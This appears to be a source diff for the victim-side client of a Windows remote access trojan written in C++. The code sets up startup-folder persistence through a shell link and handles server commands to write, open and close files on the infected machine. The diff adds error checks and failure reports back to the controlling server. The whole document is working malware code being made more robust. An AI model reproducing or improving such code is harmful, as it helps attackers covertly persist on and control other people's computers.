@@ -30,21 +30,23 @@ Victim::Victim()
     readFile.close();
 
     PWSTR start;
-    if (SHGetKnownFolderPath(FOLDERID_Startup, 0, NULL, &start) == S_OK) {
+    if (SUCCEEDED(SHGetKnownFolderPath(FOLDERID_Startup, 0, NULL, &start))) {
         std::wstring lnkPath = std::wstring(start) + L"\\" + std::wstring(exeName.begin(), exeName.end()) + L".lnk";
         //free the allocated memory
         CoTaskMemFree(start);
 
-        CoInitialize(NULL);
-        IShellLink* pShellLink = NULL;
-        CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_ALL, IID_IShellLink, (void**)&pShellLink);
-        pShellLink->SetPath(path.c_str());
-        pShellLink->SetIconLocation(path.c_str(), 0);
-        IPersistFile* pPersistFile;
-        pShellLink->QueryInterface(IID_IPersistFile, (void**)&pPersistFile);
-        pPersistFile->Save(lnkPath.c_str(), TRUE);
-        pPersistFile->Release();
-        pShellLink->Release();
+        if (SUCCEEDED(CoInitialize(NULL))) {
+            IShellLink* pShellLink = NULL;
+            if (SUCCEEDED(CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_ALL, IID_IShellLink, (void**)&pShellLink))) {
+                pShellLink->SetPath(path.c_str());
+                pShellLink->SetIconLocation(path.c_str(), 0);
+                IPersistFile* pPersistFile;
+                pShellLink->QueryInterface(IID_IPersistFile, (void**)&pPersistFile);
+                pPersistFile->Save(lnkPath.c_str(), TRUE);
+                pPersistFile->Release();   
+            }
+            pShellLink->Release();
+        }
         CoUninitialize();
     }
 
@@ -201,11 +203,17 @@ int Victim::controlVictim()
         }
         //write file
         else if (cmd == 'o') {
-            if (file == nullptr)
+            if (file == nullptr) {
+                p.clear();
+                p << sf::Uint8('h');
+                sendServer(p);
+
                 continue;
-            else if (!file->is_open()) {
+            }
+            else if (file->bad()) {
                 file->close();
                 delete file;
+                file = nullptr;
 
                 p.clear();
                 p << sf::Uint8('h');
@@ -226,9 +234,14 @@ int Victim::controlVictim()
         }
         //close file
         else if (cmd == 'i') {
-            if (file == nullptr)
+            if (file == nullptr) {
+                p.clear();
+                p << sf::Uint8('h');
+                sendServer(p);
+
                 continue;
-            else if (!file->is_open()) {
+            }
+            else if (file->bad()) {
                 file->close();
                 delete file;
                 file = nullptr;
@@ -330,6 +343,12 @@ void Victim::createNewFile()
         return;
     }
     file = new std::ofstream(filePath, std::ios::binary | std::ios::out);
+    if (file->bad()) {
+        sf::Packet p;
+        p << sf::Uint8('h');
+        sendServer(p);
+        return;
+    }
 
     sf::Packet p;
     p << sf::Uint8('y');
